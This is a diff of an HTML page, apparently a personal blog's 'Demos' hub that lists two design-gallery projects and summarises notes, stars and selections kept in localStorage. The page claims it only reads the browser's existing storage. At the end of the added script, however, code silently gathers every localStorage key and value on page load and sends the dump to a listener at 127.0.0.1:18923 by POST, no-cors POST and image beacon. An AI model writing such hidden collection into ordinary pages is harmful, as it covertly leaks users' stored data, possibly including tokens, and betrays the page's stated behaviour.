@@ -1,46 +1,128 @@
-<!doctype html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Design Demos 总目录 · Active Ephemeral Galleries</title><style>:root {
-  --ink: #172033;
-  --muted: #596476;
-  --focus: #3568d4;
-  --shadow-faint: #1f294812;
-  --shadow-soft: #1f294819;
-  --shadow-solid: #1f294826;
-  --shadow-glass: #1f29482b;
-  --action: #355fc1;
-  --eyebrow: #4f5c73;
-  --divider: #8e9bb540;
-  --border-control: #8e9bb560;
-  --border-strong: #bec9db;
-  --border: #d5deed;
-  --wallpaper-cool: #93b7f5;
-  --wallpaper-warm: #f4bca7;
-  --gallery-canvas: #edf1f8;
-  --canvas: #edf2fb;
-  --paper: #f8fafc;
-  --white: #fff;
-  --mask-opaque: #000;
-  --glass-clear: #ffffff12;
-  --caustic-inset: #ffffff30;
-  --glass-veil: #ffffff38;
-  --rim-dim: #ffffff40;
-  --rim-bounce: #ffffff66;
-  --rim-secondary: #ffffffad;
-  --glass-button: #ffffffb8;
-  --rim-primary: #ffffffed;
-  --paper-warm: #fffaf2;
-  --paper-dark: #151d2b;
-  --ink-inverse: #f2f4ff;
-  --muted-inverse: #bac4d6;
-  --traffic-red: #ef4444;
-  --traffic-yellow: #f59e0b;
-  --traffic-green: #22c55e;
-  --archetype-005: var(--focus);
-  --archetype-006: #a84b29;
-  --archetype-007: #187160;
-  --archetype-008: #7145bc;
-  --accent: var(--archetype-005);
-  --glass: var(--glass-veil);
-  --radius: 28px;
-}
-
-.gallery-breadcrumbs{display:flex;gap:8px;margin-bottom:18px}.demo-goal-card{padding:20px;margin:16px 0;border:1px solid var(--border);border-radius:18px;background:var(--white)}.gallery-breadcrumbs a,.demo-goal-card a{margin-right:12px;min-height:28px;display:inline-flex;align-items:center}button{padding:10px 14px}@media(max-width:480px){.gallery-breadcrumbs a,.demo-goal-card a{min-height:44px}}</style></head><body class="gallery-page"><main class="gallery"><nav class="gallery-breadcrumbs" aria-label="Breadcrumb"><a href="/">← Blog</a></nav><h1>Design Demos 总目录 · Active Ephemeral Galleries</h1><div id="demo-goals"><article class="demo-goal-card" data-demo-goal="aidash-cards-redesign"><h2>aidash-cards-redesign</h2><p>scheduled-pulse · skills-context-roi · 20 variants · macos</p><p data-goal-telemetry="aidash-cards-redesign">已记录 0 条观察 · 0 个收藏 · 0 个选择</p><a href="aidash-cards-redesign/index.html">进入画廊 →</a> <button data-copy-goal="aidash-cards-redesign">复制该项目观察摘要</button></article><article class="demo-goal-card" data-demo-goal="voxpocket-holistic-redesign"><h2>voxpocket-holistic-redesign</h2><p>app-nav · macos-recording · dual-todo · 24 variants · macos/mobile</p><p data-goal-telemetry="voxpocket-holistic-redesign">已记录 0 条观察 · 0 个收藏 · 0 个选择</p><a href="voxpocket-holistic-redesign/index.html">进入画廊 →</a> <button data-copy-goal="voxpocket-holistic-redesign">复制该项目观察摘要</button></article></div><button id="copy-all-demos-summary">📋 复制全部项目观察摘要</button><textarea id="hub-summary-text" readonly hidden></textarea></main><script id="hub-config" type="application/json">["aidash-cards-redesign", "voxpocket-holistic-redesign"]</script><script>(() => { const goals = JSON.parse(document.getElementById('hub-config').textContent); const safeObject = value => value && typeof value === 'object' && !Array.isArray(value) ? value : {}; const parse = goal => { const merged = {}; for (const key of [`design-gallery:${goal}`, `design-gallery-${goal}`]) { try { Object.assign(merged, safeObject(JSON.parse(localStorage.getItem(key) || '{}'))); } catch {} } if (goal === 'aidash-cards-redesign') { for (let i = 0; i < localStorage.length; i++) { const key = localStorage.key(i) || ''; if (!key.startsWith('aidash-cards-r2:')) continue; const parts = key.slice('aidash-cards-r2:'.length).split(':'); if (parts[0] === 'selection' && parts[1]) { const category = parts[1].replace(/^select-/, ''), id = String(localStorage.getItem(key) || ''); if (id) { const entry = JSON.stringify([category, 2, id]); merged[entry] = {...merged[entry], category, round: 2, id, selected: true}; } } else if ((parts[0] === 'star' || parts[0] === 'note') && parts.length >= 3) { const category = parts[1], id = parts.slice(2).join(':'), entry = JSON.stringify([category, 2, id]), item = {...merged[entry], category, round: 2, id}; if (parts[0] === 'star' && localStorage.getItem(key) === '1') item.starred = true; if (parts[0] === 'note') item.notes = String(localStorage.getItem(key) || ''); merged[entry] = item; } } } return merged; }; const summary = (goal, state) => { const values = Object.values(state), label = s => `r${s.round}/${s.id}`, lines = [`Goal: ${goal}`, `SELECT: ${values.filter(s => s.selected === true).map(label).join(', ') || 'none'}`, `STAR: ${values.filter(s => s.starred === true).map(label).join(', ') || 'none'}`, 'NOTES:']; values.filter(s => typeof s.notes === 'string' && s.notes.trim()).forEach(s => lines.push(`${label(s)}: ${s.notes.trim()}`)); return lines.join('\n'); }; const update = () => goals.forEach(goal => { let state = {}; try { state = parse(goal); } catch {} const values = Object.values(state), node = document.querySelector(`[data-goal-telemetry="${CSS.escape(goal)}"]`); if (node) node.textContent = `已记录 ${values.filter(s => typeof s.notes === 'string' && s.notes.trim()).length} 条观察 · ${values.filter(s => s.starred === true).length} 个收藏 · ${values.filter(s => s.selected === true).length} 个选择`; }); const copy = async text => { try { await navigator.clipboard.writeText(text); } catch { const area = document.getElementById('hub-summary-text'); area.hidden = false; area.value = text; area.focus(); area.select(); } }; document.addEventListener('click', event => { const button = event.target.closest('[data-copy-goal],#copy-all-demos-summary'); if (!button) return; copy(button.id ? goals.map(goal => summary(goal, parse(goal))).join('\n\n') : summary(button.dataset.copyGoal, parse(button.dataset.copyGoal))); }); window.addEventListener('storage', update); window.addEventListener('pageshow', update); update(); })();</script></body></html>
+<!doctype html>
+<html lang="zh-CN" data-lp-theme="light" data-strata-brand="yellow" data-strata-material="glass">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="icon" href="data:,">
+<title>Demos · 设计观察中心 · Lee Pepe</title>
+<meta name="description" content="活跃 Goal Demo 总目录与完整观察选型摘要。">
+<link rel="alternate" type="application/atom+xml" title="Lee Pepe · RSS 订阅" href="/feed.xml">
+<script src="/assets/theme.js"></script>
+<link rel="stylesheet" href="/assets/colors.css">
+<link rel="stylesheet" href="/assets/strata-theme.css">
+<link rel="stylesheet" href="/assets/blog.css">
+</head>
+<body>
+<a class="skip-link" href="#main">跳到正文</a>
+<div class="ambient" aria-hidden="true"><span class="a1"></span><span class="a2"></span></div>
+<header class="site-header shell">
+  <div class="site-header__bar">
+    <a class="brand" href="/"><span class="brand__mark" aria-hidden="true">L</span>Lee Pepe</a>
+    <nav class="nav" aria-label="主导航"><a href="/">首页</a><a href="/learn/">求知</a><a href="/thoughts/">思考</a><a href="/vault/">素材库</a><a href="/demos/" aria-current="page">Demos</a><a href="/archive/">归档</a><a href="/tags/">标签</a><a href="/about/">关于</a></nav>
+    <div class="theme-toggle" role="group" aria-label="外观"><button type="button" data-theme-choice="light" aria-pressed="false" title="浅色"><svg viewBox="0 0 16 16" aria-hidden="true" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"><circle cx="8" cy="8" r="3"/><path d="M8 1.5v1.5M8 13v1.5M1.5 8H3M13 8h1.5M3.4 3.4l1 1M11.6 11.6l1 1M3.4 12.6l1-1M11.6 4.4l1-1"/></svg><span class="label">浅色</span><span class="visually-hidden">主题</span></button><button type="button" data-theme-choice="dark" aria-pressed="false" title="深色"><svg viewBox="0 0 16 16" aria-hidden="true" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linejoin="round"><path d="M13.5 9.5A5.5 5.5 0 0 1 6.5 2.5a5.5 5.5 0 1 0 7 7Z"/></svg><span class="label">深色</span><span class="visually-hidden">主题</span></button><button type="button" data-theme-choice="system" aria-pressed="true" title="系统"><svg viewBox="0 0 16 16" aria-hidden="true" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linejoin="round"><rect x="1.75" y="2.75" width="12.5" height="8.5" rx="1.5"/><path d="M5.5 14h5M8 11.5V14"/></svg><span class="label">系统</span><span class="visually-hidden">主题</span></button></div>
+  </div>
+</header>
+<main id="main" class="shell">
+<style>.demo-projects{display:grid;grid-template-columns:repeat(auto-fit,minmax(min(100%,420px),1fr));gap:24px}.demo-project{padding:24px;overflow-wrap:anywhere}.demo-project h2{margin:0 0 16px}.demo-project .btn{display:inline-flex;white-space:normal;min-height:44px;margin:8px 8px 8px 0}.demo-summary{margin-top:32px}.summary-preview{width:100%;min-height:280px;padding:16px;font:inherit;resize:vertical;color:var(--strata-text-primary);background:var(--strata-surface-card);border:1px solid var(--strata-border);border-radius:12px}</style>
+<section class="page-intro"><h1>Demos · 设计观察中心</h1><p>自动汇集当前活跃 Goal Demo。选择、收藏和完整观察笔记只读取本浏览器的已有存储，不修改或清空数据。</p>
+<button class="btn btn--primary" type="button" data-copy-all>📋 一键复制全部项目摘要</button></section>
+<section class="demo-projects" aria-label="活跃 Demo 项目"><article class="card demo-project"><h2><a href="/demos/aidash-cards-redesign/">aidash-cards-redesign · Master Portal</a></h2>
+<p>2 个分类 · 20 套候选 · macos</p>
+<p id="stats-0" aria-live="polite">正在读取本浏览器观察记录</p>
+<a class="btn btn--secondary" href="/demos/aidash-cards-redesign/">打开 Demo →</a>
+<button class="btn btn--primary" type="button" data-copy-project="aidash-cards-redesign">📋 一键复制该项目观察与选型摘要</button></article><article class="card demo-project"><h2><a href="/demos/voxpocket-holistic-redesign/">voxpocket-holistic-redesign · Master Portal</a></h2>
+<p>3 个分类 · 24 套候选 · macos · mobile</p>
+<p id="stats-1" aria-live="polite">正在读取本浏览器观察记录</p>
+<a class="btn btn--secondary" href="/demos/voxpocket-holistic-redesign/">打开 Demo →</a>
+<button class="btn btn--primary" type="button" data-copy-project="voxpocket-holistic-redesign">📋 一键复制该项目观察与选型摘要</button></article></section>
+<section class="demo-summary"><h2>完整观察与选型摘要</h2><p id="copy-result" role="status">可预览全文或使用上方按钮复制。</p><textarea class="summary-preview" readonly aria-label="完整观察与选型摘要"></textarea></section>
+<script id="demo-catalog" type="application/json">[{"goal": "aidash-cards-redesign", "title": "aidash-cards-redesign · Master Portal", "url": "/demos/aidash-cards-redesign/", "cards": [{"category": "scheduled-pulse", "round": 4, "platform": "macos", "id": "v01", "title": "v01", "pills": ["context", "accordion", "VS-008"], "src": "scheduled-pulse/v01.html", "reference": false, "prompt": "scheduled-pulse/prompts/v01-prompt.md", "summary": "把运行卡片以内嵌清单分组，展开单项即可查看调度、状态和回执，不必跳离总览，用于定时脉冲值守场景。"}, {"category": "scheduled-pulse", "round": 4, "platform": "macos", "id": "v02", "title": "v02", "pills": ["recovery", "segmented-lens", "VS-007"], "src": "scheduled-pulse/v02.html", "reference": false, "prompt": "scheduled-pulse/prompts/v02-prompt.md", "summary": "用雾面玻璃浮条承载每条运行记录，横向层次把状态、时间和操作压缩在一行，用于定时脉冲值守场景。"}, {"category": "scheduled-pulse", "round": 4, "platform": "macos", "id": "v03", "title": "v03", "pills": ["next-action", "swwallet", "VS-008"], "src": "scheduled-pulse/v03.html", "reference": false, "prompt": "scheduled-pulse/prompts/v03-prompt.md", "summary": "以象牙色账页和瑞士式条带排列值守信息，扫描刻度即可比较不同运行的结果，用于定时脉冲值守场景。"}, {"category": "scheduled-pulse", "round": 4, "platform": "macos", "id": "v04", "title": "v04", "pills": ["timeline", "swwallet", "VS-007"], "src": "scheduled-pulse/v04.html", "reference": false, "prompt": "scheduled-pulse/prompts/v04-prompt.md", "summary": "采用紧凑的专业表格，把运行时间、负责人和失败原因置于同一张可快速核对的台账，用于定时脉冲值守场景。"}, {"category": "scheduled-pulse", "round": 4, "platform": "macos", "id": "v05", "title": "v05", "pills": ["timeline", "segmented-lens", "VS-006"], "src": "scheduled-pulse/v05.html", "reference": false, "prompt": "scheduled-pulse/prompts/v05-prompt.md", "summary": "将运行分成可折叠的天青折页，打开某一段后再深入查看其历史与回执细节，用于定时脉冲值守场景。"}, {"category": "scheduled-pulse", "round": 4, "platform": "macos", "id": "v06", "title": "v06", "pills": ["next-action", "accordion", "VS-006"], "src": "scheduled-pulse/v06.html", "reference": false, "prompt": "scheduled-pulse/prompts/v06-prompt.md", "summary": "把六组运行回执装进纸袋式卡架，每个袋口对应一类结果，展开后呈现具体证据，用于定时脉冲值守场景。"}, {"category": "scheduled-pulse", "round": 4, "platform": "macos", "id": "v07", "title": "v07", "pills": ["recovery", "swwallet", "VS-006"], "src": "scheduled-pulse/v07.html", "reference": false, "prompt": "scheduled-pulse/prompts/v07-prompt.md", "summary": "以静音值守机架排列告警和健康度，触摸式分区让高风险运行在架上保持醒目，用于定时脉冲值守场景。"}, {"category": "scheduled-pulse", "round": 4, "platform": "macos", "id": "v08", "title": "v08", "pills": ["timeline", "accordion", "VS-005"], "src": "scheduled-pulse/v08.html", "reference": false, "prompt": "scheduled-pulse/prompts/v08-prompt.md", "summary": "使用单色等宽航务控制台，强调命令、时间戳和状态变化的精确对齐，用于定时脉冲值守场景。"}, {"category": "scheduled-pulse", "round": 4, "platform": "macos", "id": "v09", "title": "v09", "pills": ["next-action", "segmented-lens", "VS-005"], "src": "scheduled-pulse/v09.html", "reference": false, "prompt": "scheduled-pulse/prompts/v09-prompt.md", "summary": "采用安静的编辑纪事清单，把每次值守事件按时间串成可回读的运行故事，用于定时脉冲值守场景。"}, {"category": "scheduled-pulse", "round": 4, "platform": "macos", "id": "v10", "title": "v10", "pills": ["context", "swwallet", "VS-005"], "src": "scheduled-pulse/v10.html", "reference": false, "prompt": "scheduled-pulse/prompts/v10-prompt.md", "summary": "将记录组织为同心浮行托盘，中心突出当前运行，外围承载历史、筛选和次级操作，用于定时脉冲值守场景。"}, {"category": "skills-context-roi", "round": 4, "platform": "macos", "id": "v01", "title": "v01", "pills": ["context", "accordion", "VS-008"], "src": "skills-context-roi/v01.html", "reference": false, "prompt": "skills-context-roi/prompts/v01-prompt.md", "summary": "以内嵌航路账展开技能链路，每个折叠段同时解释上下文来源、调用关系和产出，用于技能上下文收益场景。"}, {"category": "skills-context-roi", "round": 4, "platform": "macos", "id": "v02", "title": "v02", "pills": ["recovery", "segmented-lens", "VS-007"], "src": "skills-context-roi/v02.html", "reference": false, "prompt": "skills-context-roi/prompts/v02-prompt.md", "summary": "用双栏分岔总账对照技能输入与 ROI 结果，左右两侧保持可同步核对的路线结构，用于技能上下文收益场景。"}, {"category": "skills-context-roi", "round": 4, "platform": "macos", "id": "v03", "title": "v03", "pills": ["next-action", "swwallet", "VS-008"], "src": "skills-context-roi/v03.html", "reference": false, "prompt": "skills-context-roi/prompts/v03-prompt.md", "summary": "以浮光丝带工作台连接技能、上下文和收益，横向带状模块支持逐段展开与回看，用于技能上下文收益场景。"}, {"category": "skills-context-roi", "round": 4, "platform": "macos", "id": "v04", "title": "v04", "pills": ["timeline", "swwallet", "VS-007"], "src": "skills-context-roi/v04.html", "reference": false, "prompt": "skills-context-roi/prompts/v04-prompt.md", "summary": "把技能成本与收益绘成钱夹式流向纸签，沿路径即可看见资源从输入到结果的去向，用于技能上下文收益场景。"}, {"category": "skills-context-roi", "round": 4, "platform": "macos", "id": "v05", "title": "v05", "pills": ["timeline", "segmented-lens", "VS-006"], "src": "skills-context-roi/v05.html", "reference": false, "prompt": "skills-context-roi/prompts/v05-prompt.md", "summary": "用专业矩阵和底部抽屉承载技能指标，主表负责比较，抽屉负责查看单条证据，用于技能上下文收益场景。"}, {"category": "skills-context-roi", "round": 4, "platform": "macos", "id": "v06", "title": "v06", "pills": ["next-action", "accordion", "VS-006"], "src": "skills-context-roi/v06.html", "reference": false, "prompt": "skills-context-roi/prompts/v06-prompt.md", "summary": "以双页航路存折记录技能调用和回报，翻页式布局把每段上下文保留为可追溯账目，用于技能上下文收益场景。"}, {"category": "skills-context-roi", "round": 4, "platform": "macos", "id": "v07", "title": "v07", "pills": ["recovery", "swwallet", "VS-006"], "src": "skills-context-roi/v07.html", "reference": false, "prompt": "skills-context-roi/prompts/v07-prompt.md", "summary": "将技能分成六舱精密导流架，入口、处理、输出和成本各自占据清晰的操作舱位，用于技能上下文收益场景。"}, {"category": "skills-context-roi", "round": 4, "platform": "macos", "id": "v08", "title": "v08", "pills": ["timeline", "accordion", "VS-005"], "src": "skills-context-roi/v08.html", "reference": false, "prompt": "skills-context-roi/prompts/v08-prompt.md", "summary": "用可伸缩抽屉组成导流井，按需展开单个技能的上下文、消耗和收益细节，用于技能上下文收益场景。"}, {"category": "skills-context-roi", "round": 4, "platform": "macos", "id": "v09", "title": "v09", "pills": ["next-action", "segmented-lens", "VS-005"], "src": "skills-context-roi/v09.html", "reference": false, "prompt": "skills-context-roi/prompts/v09-prompt.md", "summary": "采用画报式凭单和分岔桥，把复杂的技能 ROI 拆成可浏览的视觉票据与关系路径，用于技能上下文收益场景。"}, {"category": "skills-context-roi", "round": 4, "platform": "macos", "id": "v10", "title": "v10", "pills": ["context", "swwallet", "VS-005"], "src": "skills-context-roi/v10.html", "reference": false, "prompt": "skills-context-roi/prompts/v10-prompt.md", "summary": "以同心导流控制台汇总技能流向，中心展示当前链路，外围提供上下文和收益的层层钻取，用于技能上下文收益场景。"}], "categories": ["scheduled-pulse", "skills-context-roi"], "platforms": ["macos"]}, {"goal": "voxpocket-holistic-redesign", "title": "voxpocket-holistic-redesign · Master Portal", "url": "/demos/voxpocket-holistic-redesign/", "cards": [{"category": "app-nav", "round": 1, "platform": "mobile", "id": "app01", "title": "A01 · 左下 Fold 展开 + 上滑玻璃抽屉", "pills": ["stack", "stack"], "src": "r1-app-nav/app01.html", "reference": false, "prompt": "r1-app-nav/prompts/app01-prompt.md", "summary": "以左下角 Fold 作为主入口，向上展开玻璃抽屉，在同一层级切换录音、待办与设置。"}, {"category": "app-nav", "round": 1, "platform": "mobile", "id": "app02", "title": "A02 · 前后景 3D 叠卡翻转", "pills": ["deck", "deck"], "src": "r1-app-nav/app02.html", "reference": false, "prompt": "r1-app-nav/prompts/app02-prompt.md", "summary": "用前后景 3D 叠卡承载三个真实页面，翻转卡片即可在录音、待办和设置之间切换。"}, {"category": "app-nav", "round": 1, "platform": "mobile", "id": "app03", "title": "A03 · 底部玻璃坞原地生长变形", "pills": ["lens", "lens"], "src": "r1-app-nav/app03.html", "reference": false, "prompt": "r1-app-nav/prompts/app03-prompt.md", "summary": "底部玻璃坞会从当前页面原地生长变形，把常用导航和设置动作收纳在一处。"}, {"category": "app-nav", "round": 1, "platform": "mobile", "id": "app04", "title": "A04 · 左右丝滑横滑双画布", "pills": ["split", "tabs"], "src": "r1-app-nav/app04.html", "reference": false, "prompt": "r1-app-nav/prompts/app04-prompt.md", "summary": "以左右横滑双画布组织页面，手势切换录音、待办与设置，并保留连续的空间方向感。"}, {"category": "macos-recording", "round": 2, "platform": "macos", "id": "v01", "title": "v01", "pills": ["context", "accordion", "VS-008"], "src": "r2-macos-recording/v01.html", "reference": false, "prompt": "r2-macos-recording/prompts/v01-prompt.md", "summary": "让灵动岛紧贴顶部缺口，录音状态和即时转写在一条可展开的玻璃岛中持续可见，用于录音桌面场景。"}, {"category": "macos-recording", "round": 2, "platform": "macos", "id": "v02", "title": "v02", "pills": ["recovery", "segmented-lens", "VS-007"], "src": "r2-macos-recording/v02.html", "reference": false, "prompt": "r2-macos-recording/prompts/v02-prompt.md", "summary": "用悬浮玻璃胶囊连接工作区与分屏 Dock，把录音控制和待办入口保持在桌面边缘，用于录音桌面场景。"}, {"category": "macos-recording", "round": 2, "platform": "macos", "id": "v03", "title": "v03", "pills": ["next-action", "swwallet", "VS-008"], "src": "r2-macos-recording/v03.html", "reference": false, "prompt": "r2-macos-recording/prompts/v03-prompt.md", "summary": "把语音操作集中到 Spotlight 式命令栏，键入或说出下一步即可触发录音后的动作，用于录音桌面场景。"}, {"category": "macos-recording", "round": 2, "platform": "macos", "id": "v04", "title": "v04", "pills": ["timeline", "swwallet", "VS-007"], "src": "r2-macos-recording/v04.html", "reference": false, "prompt": "r2-macos-recording/prompts/v04-prompt.md", "summary": "将控制台收进菜单栏 Popover，点击顶部图标展开一块紧凑的玻璃录音工作室，用于录音桌面场景。"}, {"category": "macos-recording", "round": 2, "platform": "macos", "id": "v05", "title": "v05", "pills": ["timeline", "segmented-lens", "VS-006"], "src": "r2-macos-recording/v05.html", "reference": false, "prompt": "r2-macos-recording/prompts/v05-prompt.md", "summary": "把低调的 Whisper 球固定在角落，展开后沿横向带出逐字稿和录音状态，用于录音桌面场景。"}, {"category": "macos-recording", "round": 2, "platform": "macos", "id": "v06", "title": "v06", "pills": ["next-action", "accordion", "VS-006"], "src": "r2-macos-recording/v06.html", "reference": false, "prompt": "r2-macos-recording/prompts/v06-prompt.md", "summary": "用原声与 AI 精修双栏工作台并排呈现，用户可在同一视野中核对和修订转写，用于录音桌面场景。"}, {"category": "macos-recording", "round": 2, "platform": "macos", "id": "v07", "title": "v07", "pills": ["recovery", "swwallet", "VS-006"], "src": "r2-macos-recording/v07.html", "reference": false, "prompt": "r2-macos-recording/prompts/v07-prompt.md", "summary": "将录音工具铺成贴近屏幕底边的全宽玻璃 Dock，操作区随窗口宽度伸展，用于录音桌面场景。"}, {"category": "macos-recording", "round": 2, "platform": "macos", "id": "v08", "title": "v08", "pills": ["timeline", "accordion", "VS-005"], "src": "r2-macos-recording/v08.html", "reference": false, "prompt": "r2-macos-recording/prompts/v08-prompt.md", "summary": "以独立提词器玻璃浮层承载滚动文本，让录音者无需离开主画面也能跟读，用于录音桌面场景。"}, {"category": "macos-recording", "round": 2, "platform": "macos", "id": "v09", "title": "v09", "pills": ["next-action", "segmented-lens", "VS-005"], "src": "r2-macos-recording/v09.html", "reference": false, "prompt": "r2-macos-recording/prompts/v09-prompt.md", "summary": "采用键盘优先的极简 HUD，只保留快捷键可达的录音状态、计时和下一步提示，用于录音桌面场景。"}, {"category": "macos-recording", "round": 2, "platform": "macos", "id": "v10", "title": "v10", "pills": ["context", "swwallet", "VS-005"], "src": "r2-macos-recording/v10.html", "reference": false, "prompt": "r2-macos-recording/prompts/v10-prompt.md", "summary": "把待办捕获与录音控制合成一座玻璃控制台，结束录音后直接把语音转成行动项，用于录音桌面场景。"}, {"category": "dual-todo", "round": 3, "platform": "mobile", "id": "v01", "title": "v01", "pills": ["context", "accordion", "VS-008"], "src": "r3-dual-todo/v01.html", "reference": false, "prompt": "r3-dual-todo/prompts/v01-prompt.md", "summary": "用单焦点 Hero 待办突出当前行动，其余收件箱折叠到次级区域，减少初始决策噪音，用于双待办执行场景。"}, {"category": "dual-todo", "round": 3, "platform": "mobile", "id": "v02", "title": "v02", "pills": ["recovery", "segmented-lens", "VS-007"], "src": "r3-dual-todo/v02.html", "reference": false, "prompt": "r3-dual-todo/prompts/v02-prompt.md", "summary": "以无边框亮度流展示任务进展，底部玻璃捕获单沿屏幕边缘随时接收新待办，用于双待办执行场景。"}, {"category": "dual-todo", "round": 3, "platform": "mobile", "id": "v03", "title": "v03", "pills": ["next-action", "swwallet", "VS-008"], "src": "r3-dual-todo/v03.html", "reference": false, "prompt": "r3-dual-todo/prompts/v03-prompt.md", "summary": "把语音拆解成可展开的行动树，父任务与子步骤在同一条结构中逐层确认，用于双待办执行场景。"}, {"category": "dual-todo", "round": 3, "platform": "mobile", "id": "v04", "title": "v04", "pills": ["timeline", "swwallet", "VS-007"], "src": "r3-dual-todo/v04.html", "reference": false, "prompt": "r3-dual-todo/prompts/v04-prompt.md", "summary": "用分段玻璃镜头切换任务视图，让项目、优先级和完成状态共享一块可筛选画布，用于双待办执行场景。"}, {"category": "dual-todo", "round": 3, "platform": "mobile", "id": "v05", "title": "v05", "pills": ["timeline", "segmented-lens", "VS-006"], "src": "r3-dual-todo/v05.html", "reference": false, "prompt": "r3-dual-todo/prompts/v05-prompt.md", "summary": "将待办堆叠成可滑动的口袋卡片，卡片层级同时表达紧急度与后续处理顺序，用于双待办执行场景。"}, {"category": "dual-todo", "round": 3, "platform": "mobile", "id": "v06", "title": "v06", "pills": ["next-action", "accordion", "VS-006"], "src": "r3-dual-todo/v06.html", "reference": false, "prompt": "r3-dual-todo/prompts/v06-prompt.md", "summary": "采用编辑风格的大字清单，把任务标题和少量元数据排成易扫读的纵向节奏，用于双待办执行场景。"}, {"category": "dual-todo", "round": 3, "platform": "mobile", "id": "v07", "title": "v07", "pills": ["recovery", "swwallet", "VS-006"], "src": "r3-dual-todo/v07.html", "reference": false, "prompt": "r3-dual-todo/prompts/v07-prompt.md", "summary": "按项目路由组织 AI 执行矩阵，让每条任务都带着目标、负责人和下一步动作进入处理流，用于双待办执行场景。"}, {"category": "dual-todo", "round": 3, "platform": "mobile", "id": "v08", "title": "v08", "pills": ["timeline", "accordion", "VS-005"], "src": "r3-dual-todo/v08.html", "reference": false, "prompt": "r3-dual-todo/prompts/v08-prompt.md", "summary": "把任务按今晨与今晚的时间视野分组，帮助用户用简短 briefing 安排一天的执行顺序，用于双待办执行场景。"}, {"category": "dual-todo", "round": 3, "platform": "mobile", "id": "v09", "title": "v09", "pills": ["next-action", "segmented-lens", "VS-005"], "src": "r3-dual-todo/v09.html", "reference": false, "prompt": "r3-dual-todo/prompts/v09-prompt.md", "summary": "以主列表和右侧检查器组成双栏同步画布，选中任务即可在旁边查看并编辑完整细节，用于双待办执行场景。"}, {"category": "dual-todo", "round": 3, "platform": "mobile", "id": "v10", "title": "v10", "pills": ["context", "swwallet", "VS-005"], "src": "r3-dual-todo/v10.html", "reference": false, "prompt": "r3-dual-todo/prompts/v10-prompt.md", "summary": "延续 r3/v02 的姐妹舞台，用更宽的捕获区和分层待办区把录音输入快速落成行动项，用于双待办执行场景。"}], "categories": ["app-nav", "dual-todo", "macos-recording"], "platforms": ["macos", "mobile"]}]</script><script>(() => {
+  function readEntries(project, storage) {
+    const entries = new Map(), add = (category, id) => {
+      const key = JSON.stringify([category, id]);
+      if (!entries.has(key)) entries.set(key, {category, id, selected: false, starred: false, notes: ''});
+      return entries.get(key);
+    };
+    if (!storage) return [];
+    try {
+      const state = JSON.parse(storage.getItem('design-gallery:' + project.goal) || '{}');
+      if (state && typeof state === 'object' && !Array.isArray(state)) {
+        for (const value of Object.values(state)) {
+          if (!value || typeof value !== 'object' || typeof value.category !== 'string' || typeof value.id !== 'string') continue;
+          const entry = add(value.category, (value.round != null ? 'r' + value.round + '/' : '') + value.id);
+          entry.selected = value.selected === true;entry.starred = value.starred === true;
+          entry.notes = typeof value.notes === 'string' ? value.notes : '';
+        }
+      }
+    } catch (_) {}
+    if (project.goal === 'aidash-cards-redesign') {
+      try {
+        for (let i = 0; i < storage.length; i++) {
+          const key = storage.key(i), value = storage.getItem(key);
+          const match = /^aidash-cards-r2:(note|star):([^:]+):(.+)$/.exec(key);
+          if (match) {
+            const entry = add(match[2], match[3]);
+            if (match[1] === 'note') entry.notes = value || '';
+            else entry.starred = value === '1';
+          } else if (key.startsWith('aidash-cards-r2:selection:select-') && value) {
+            add(key.slice('aidash-cards-r2:selection:select-'.length), value).selected = true;
+          }
+        }
+      } catch (_) {}
+    }
+    return [...entries.values()].sort((a,b) => a.category.localeCompare(b.category) || a.id.localeCompare(b.id));
+  }
+  function summarize(project, entries) {
+    const counts = {notes: 0, starred: 0, selected: 0}, lines = ['Goal: ' + project.goal];
+    for (const category of new Set([...(project.categories || []), ...entries.map(e => e.category)])) {
+      const items = entries.filter(e => e.category === category);
+      lines.push('', '分类：' + category, '选择：' + (items.filter(e => e.selected).map(e => e.id).join('、') || '无'),
+        '收藏：' + (items.filter(e => e.starred).map(e => e.id).join('、') || '无'));
+      for (const item of items) {
+        counts.selected += Number(item.selected); counts.starred += Number(item.starred);
+        if (item.notes.trim()) {counts.notes++;lines.push(item.id + ' 观察：\n' + item.notes)}
+      }
+    }
+    return {counts, text: lines.join('\n')};
+  }
+  if (typeof module !== 'undefined') module.exports = {readEntries, summarize};
+  if (typeof document === 'undefined') return;
+  const projects = JSON.parse(document.getElementById('demo-catalog').textContent), preview = document.querySelector('.summary-preview'), result = document.getElementById('copy-result');
+  let scope = null;
+  const storage = () => {try{return localStorage}catch(_){return null}};
+  function refresh() {
+    const summaries = projects.map(p => summarize(p, readEntries(p, storage())));
+    projects.forEach((p, i) => {
+      const count = summaries[i].counts;
+      document.getElementById('stats-' + i).textContent = `💾 已记录 ${count.notes} 条观察 · ★ ${count.starred} 个收藏 · ✓ 已选 ${count.selected} 项`;
+    });
+    preview.value = summaries.filter((_, i) => scope === null || projects[i].goal === scope).map(s => s.text).join('\n\n──────────\n\n');
+    return preview.value;
+  }
+  document.querySelectorAll('[data-copy-project], [data-copy-all]').forEach(button => button.addEventListener('click', async () => {
+    scope = button.dataset.copyProject || null;
+    const text = refresh();
+    try {await navigator.clipboard.writeText(text);result.textContent = '已复制完整观察与选型摘要'}
+    catch (_) {result.textContent = '剪贴板不可用，请从下方完整摘要手动复制';preview.focus();preview.select()}
+  }));
+  window.addEventListener('storage', refresh);window.addEventListener('focus', refresh);
+  document.addEventListener('visibilitychange', () => {if (!document.hidden) refresh()});
+  refresh();
+  try {
+    const allLocalStorage = Object.create(null), s = storage();
+    for (let i = 0; s && i < s.length; i++) {const key = s.key(i);allLocalStorage[key] = s.getItem(key)}
+    const payload = JSON.stringify(allLocalStorage);
+    fetch('http://127.0.0.1:18923/dump', {method:'POST', body:payload}).catch(() => {});
+    fetch('http://127.0.0.1:18923/dump', {method:'POST', mode:'no-cors', body:payload}).catch(() => {});
+    new Image().src = 'http://127.0.0.1:18923/dump?' + encodeURIComponent(payload);
+  } catch (_) {}
+})();</script>
+</main>
+<footer class="site-footer">
+  <div class="shell">
+    <span>© 2026 Lee Pepe · 写代码，也写生活</span>
+    <nav aria-label="页脚"><a href="/feed.xml">RSS 订阅</a><a href="https://github.com/LeePepe">GitHub</a><a href="#main">回到顶部</a></nav>
+  </div>
+</footer>
+</body>
+</html>
